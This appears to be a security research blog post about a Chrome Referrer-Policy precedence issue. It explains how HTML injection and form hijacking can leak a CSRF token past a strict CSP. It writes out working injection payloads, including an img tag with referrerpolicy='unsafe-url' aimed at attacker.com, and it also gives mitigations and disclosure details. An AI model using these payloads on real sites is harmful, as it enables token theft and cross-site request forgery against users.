---
title: "Chrome Referrer-Policy override Cross-Site data leak and strict CSP bypass"
date: 2024-08-09 12:01:00 +0800
categories: [Novel Technique]
tags: CSP Referrer-Policy XS-Leak
---

One of discoveries of this research was that it is possible to chain few functionalities and misconfigurations together in order to achieve Cross-Site (XS) leak with HTML injection, while strict <span style="color:lightblue;">Content-Security-Policy</span> (CSP) is present.  This abuse is possible due to the Chrome following RFC strictly.

Specifically, if a site uses forms to send user-supplied data, the usual CSP directive to prevent leakage of data via forms alone is <span style="color:orange;">form-action ’self’</span>. However, even if this setting is present, we can still get around this directive by overriding a form’s attributes and abuse the Chrome <span style="color:lightblue;">Referrer-Policy </span>handling bug. The technique in this blog can be abused if the <span style="color:orange;">default-src</span> policy is not set. We hope that this blog will raise awareness and demonstrate the risks of not including this CSP policy in websites.

To understand this, let’s briefly touch on ‘Referer’ in web apps.

### What is Referer

The ‘<span style="color:lightblue;">Referer</span>’ (spelled "Referrer", but RFC has it misspelled) is an HTTP request header field that identifies the URL of the web page that linked to the requested resource. In other words, when you click a hyperlink, the browser typically sends the URL of the page you came from, to the server of the page you are visiting. This helps with analytics, logging, and security purposes.

### What is Referrer-Policy

<span style="color:lightblue;">Referrer-Policy</span> is HTTP response header that allows a website to control how much referrer information is sent along with requests. Different policies can be set to either send full URLs, stripped URLs, or no referrer information at all.

Some common values for the <span style="color:lightblue;">Referrer-Policy</span> include:

- <span style="color:orange;">no-referrer</span>: No referrer information is sent
- <span style="color:orange;">origin</span>: Only the origin part of the URL is sent
- <span style="color:orange;">strict-origin-when-cross-origin</span>: Full URL is sent to same-origin requests and only the origin part is sent to cross-origin requests. (This will be the default value if the policy is not specified within the HTTP response header)

These policies help improve user privacy and security by restricting the amount of potentially sensitive information shared between websites.

### The problem

The <span style="color:lightblue;">Referrer-Policy</span> response header is often not specified by a server. Browsers will take care of this by providing a default fallback to <span style="color:orange;">strict-origin-when-cross-origin</span>, which is regarded as a secure policy. However, browsers do not follow the HTTP specification correctly regarding the precedence of this policy.

Let's consider the scenario where the site utilizes forms with CSRF token to submit data. The attacker has the ability to inject arbitrary HTML in the input field.

<img width="1301" height="472" alt="Image" src="https://github.com/user-attachments/assets/78493825-b266-440c-8b73-ba81a6b80996" />

Google’s CSP evaluator regards defined CSP policy as secure:

<img width="1310" height="701" alt="Image" src="https://github.com/user-attachments/assets/d58a999f-0c39-4950-a415-d99e3bbf4dbf" />

Let's break it. Based on above, the following HTML injectable tags can specify their own referrerpolicy attribute: 

```html
<meta>, <a>, <img>, <area>, <iframe>, <link>.
```

### Chrome & RFC security issue

In our example, let’s say an attacker injects: 

```html
“><img src="https://attacker.com/" referrerpolicy="unsafe-url" />
```

The Chrome browser will use the <span style="color:lightblue;">referrerpolicy</span> defined from within the tag attribute, as it has the highest precedence. This means that with only HTML injection, the attacker can leak the whole URL from the current page, no matter if the server previously defined its own policy via response header or if the header is missing.

As this is a bug in Chrome by itself, the application must have sensitive info in URL for this to be abused. If the entire URL can be leaked, I was wondering what if we can somehow forcefully transfer the CSRF token from the form to the URL and then leak it afterwards.

Turns out we can - by injecting one input field, which overrides form's <span style="color:lightblue;">formaction</span> and <span style="color:lightblue;">formmethod</span> attributes and points the submitted form data to the same endpoint, per inspiration by the Portswigger’s form hijacking [blog post](https://portswigger.net/research/using-form-hijacking-to-bypass-csp):

```html
 "><input formaction="dangling.php" formmethod="get" type="submit" value="ClickMeToLeak" />`
```

<img width="1426" height="399" alt="Image" src="https://github.com/user-attachments/assets/5728420a-7db4-4b8f-8065-5519812f03fb" />

 Once a user clicks on the injected button, the remaining parameters from within the form will be forwarded to the same-endpoint URL, including the CSRF token value. Great, we can forcefully include the CSRF token in the URL. Let’s see how this trick helps us.

 #### Vulnerable parameter re-specification

 As we injected one `<input>` of type submit, we can also inject an additional one, which will re-specify the vulnerable parameter. The injection of the second `<input>` tag will look similar to:
 
 ```html
<input hidden name="vulnerable" value='"><img src%3D"http%3A%2F%2Fattacker.com" referrerpolicy%3D"unsafe-url"%2F>'>
```

It will re-specify the ‘vulnerable’ GET parameter and set its value to arbitrary HTML. The final payload looks like the following:

```html
"><input formaction="dangling.php" formmethod="get" type="submit" value="ClickMeToLeak" /><input hidden name="vulnerable" value='"><img src%3D"http%3A%2F%2Fattacker.com" referrerpolicy%3D"unsafe-url"%2F>'>
```

<img width="1428" height="407" alt="Image" src="https://github.com/user-attachments/assets/0cf99a1e-56f4-4311-92fc-b89059a65bde" />

Once a user clicks on the injected button, the CSRF token is moved to the URL. Furthermore, arbitrary HTML (image) gets rendered:

<img width="1429" height="500" alt="Image" src="https://github.com/user-attachments/assets/661ff7e6-b892-4ad4-af09-14561ca0dd45" />

Re-specified vulnerable parameter will reflect the injected `<img>` tag with ‘src’ pointing to the attacker domain with overridden referrerpolicy, which in turn leaks the entire URL to the attacker – in the Referer header!

<img width="1426" height="680" alt="Image" src="https://github.com/user-attachments/assets/8c09827f-f371-4e78-835b-f14d84e3c2ba" />

By using this technique, it is possible to utilize HTML injection within the same endpoint twice in order to leak the secret token cross-domain. Once the token is leaked, the attacker can inject additional redirect with `<meta>` HTML tag to redirect victim to the attacking site (which now has the anti-CSRF token).

### Summary of steps

Injecting first `<input>` tag and abusing the ability to assign own formmethod and formaction properties to manipulate the form request method to GET, forcing remaining form parameters to the URL.

Injecting second `<input>` tag. It will re-specify ‘vulnerable’ parameter after the malicious input button is pressed.

Abusing the Referrer-policy override to leak CSRF token from the URL cross-domain. We utilized `<img>` tag, because there is no img-src and default-src CSP policies, however note that other tags could also be used.

### Mitigations

This abuse can be prevented by including a <span style="color:orange;">default-src</span> policy which, when missing the CSP evaluator does not evaluate as risky. Alternatively, explicitly specify all other <span style="color:orange;">*-src</span> directives (there are quite a few of them). The shown technique works even if <span style="color:orange;">Content-Security-Policy: form-action</span> is missing or defined as <span style="color:orange;">‘self’</span>, which mostly will be the case.

In order to stop this via <span style="color:orange;">form-action</span> alone, it will need to be set to <span style="color:orange;">‘none’</span>, completely disabling form-usage within the site, which is not practical, especially having forms as intended functionality.

Hopefully, this blog demonstrates why sites should always include all ‘src’ directives in their CSP configuration.

### Future specification improvements

Currently, Chrome is the only browser that follows the <span style="color:lightblue;">Referrer-Policy</span> precedence, as detailed in specification and counter-intuitively this is the reason why it's vulnerable in this specific scenario. Unfortunately, <span style="color:lightblue;">Referrer-Policy</span> defined from within the tag attribute of specific HTML tags will have the highest precedence. This allows attackers to overwrite the server-defined policy. 

From the security perspective this is not great, as discussed with Google engineers, the change in the specification will be required to define stricter <span style="color:lightblue;">Referrer-Policy</span> precedence. Other browsers for the most part do not follow the specification therefore those are better protected against this attack. There are few edge cases, though. For example: Firefox will have <span style="color:lightblue;">referrerpolicy precedence</span> only for the `<a>` tag and the same abuse can be achieved with two clicks.

With currently available mitigations, utilize <span style="color:orange;">default-src</span> CSP directive and try not to transfer sensitive information via URL, though sometimes this is ultimately necessary. If so, make sure HTML injection vulnerability is not possible in that endpoint.

The issue with <span style="color:lightblue;">Referrer-Policy</span> precedence has been raised to Google. It is not fixed yet, until the specification changes, as Chrome follows the spec: [Issue tracker Link](https://issuetracker.google.com/issues/332052787).


